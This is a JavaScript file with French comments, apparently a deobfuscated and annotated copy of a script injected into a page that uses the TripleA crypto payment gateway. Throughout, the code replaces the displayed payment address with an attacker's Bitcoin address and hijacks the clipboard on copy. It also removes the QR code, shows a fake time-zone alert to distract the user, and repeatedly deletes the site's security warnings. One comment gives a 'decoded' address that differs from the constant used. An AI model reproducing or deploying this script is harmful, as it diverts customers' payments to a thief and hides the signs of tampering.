(function() {
    'use strict';

    // Adresse crypto cible (décodée depuis Base64 : "bc1qp3wff9p9jm5l5nnwxs9szlh33uc4934agp9mqy")
    const ADRESSE_CRYPTO_MALVEILLANTE = "bc1qa6venfpvkn4q843pmyjp6y5yttfjd0rxenpv5u";
    let actionEffectuee = false;

    // Fonction principale qui remplace l'adresse de la victime par celle du pirate
    const detournerAdresse = () => {
        // Si l'utilisateur clique sur l'icône de copie "TripleA", on force l'écriture de l'adresse du pirate dans le presse-papier
        const boutonCopie = document.querySelector('.triplea-copy-icon-for-address');
        if (boutonCopie) {
            boutonCopie.addEventListener('click', () => {
                setTimeout(() => {
                    navigator.clipboard.writeText(ADRESSE_CRYPTO_MALVEILLANTE);
                }, 100);
            });
        }

        if (actionEffectuee) return false;

        // Cible les éléments de l'interface (généralement liés à la passerelle de paiement TripleA)
        const champAdresse = document.querySelector('.triplea-new-address');
        const conteneurQrCode = document.querySelector('.triplea-qrcode-container');

        if (champAdresse && conteneurQrCode) {
            // 1. Remplace l'adresse affichée à l'écran par celle du pirate
            champAdresse.innerText = ADRESSE_CRYPTO_MALVEILLANTE;
            
            // 2. Supprime le QR code original pour éviter que la victime ne remarque la différence en scannant
            conteneurQrCode.remove();
            console.log('QR code container removed');
            
            actionEffectuee = true;

            // 3. Affiche une fausse alerte pour distraire l'utilisateur pendant la manipulation
            setTimeout(() => {
                alert("Le fuseau horaire a été modifié. Appuyez sur Fermer pour continuer.");
            }, 1000);

            return true;
        }
        return false;
    };

    // Boucle d'exécution pour s'assurer que le détournement a bien lieu dès que possible
    const demarrerVerification = () => {
        const intervalle = setInterval(() => {
            if (detournerAdresse()) {
                clearInterval(intervalle);
            }
        }, 100);
    };

    // Lance le script selon l'état de chargement de la page
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', demarrerVerification);
    } else {
        demarrerVerification();
    }

    // Surveille dynamiquement la page (via MutationObserver) au cas où l'adresse apparaîtrait plus tard via AJAX/React
    const observateur = new MutationObserver(() => {
        if (!actionEffectuee) {
            detournerAdresse();
        }
    });
    observateur.observe(document.body, { childList: true, subtree: true });

    // Supprime en boucle (toutes les 100ms) les éventuelles alertes de sécurité / avertissements du site
    setInterval(() => {
        document.querySelectorAll('[data-test-id="alert-wrapper-WARNING"]').forEach(alerte => {
            alerte.remove();
        });
    }, 100);
})();
